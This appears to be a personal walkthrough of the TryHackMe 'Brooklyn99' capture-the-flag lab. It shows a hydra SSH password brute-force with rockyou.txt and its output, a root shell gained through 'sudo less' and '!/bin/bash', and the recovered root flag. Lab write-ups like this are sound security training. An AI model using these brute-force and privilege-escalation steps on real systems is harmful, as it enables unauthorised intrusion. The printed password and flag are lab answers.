#   Tryhackme - Brooklyn99 CTF

##  IP = 10.10.197.165
##  Walkthrough by
```
Shaswata Saha
11-07-23
12:58AM
```

##  Steps followed
1.  Nmap scan

2.  gobuster scan

3.  We find the note_to_jake.txt file where we find that his password is weak. Let's brute force it!
```bash
hydra -l jake -P Documents/rockyou.txt ssh://10.10.197.165
```

We got the password!
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ hydra -l jake -P Documents/rockyou.txt ssh://10.10.197.165

Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-11 02:26:35
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.197.165:22/
[22][ssh] host: 10.10.197.165   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-11 02:27:39
                                                                                     
```

4.  After going to the ssh, we get the user.txt file.

5.  Less which is a file pager (that is, a memory-efficient utility for displaying text one screenful at a time). Less has many more features than the basic pager “more”. If you’ve interacted with less more you probably know that you can execute a shell while you are using less by just passing the argument
```bash
!/bin/bash
```
If you didn’t know that you couls use a cheatsheet called [GTFOBins](https://gtfobins.github.io/gtfobins/less/#sudo)

6.  Just by searching less we get possible cheatsheet

7.  I clicked on sudo and got the commands i was to run

8.  The file to open doesn't necessarily have to be profile you can open any file. So i created a file called nano.txt and opened it with less. After i had opened the file i typed the command that will spawn a shell:
```bash
!/bin/bash
```
Then pressed enter

9.  And voila we had a root shell on the box

10. Now we can get both the user and root flag submit them and get our points
```bash
jake@brookly_nine_nine:/$ sudo less /etc/profile
root@brookly_nine_nine:/# ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
root@brookly_nine_nine:/# cd /root
root@brookly_nine_nine:/root# ls
root.txt
root@brookly_nine_nine:/root# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
root@brookly_nine_nine:/root# 
```
We hacked the root..!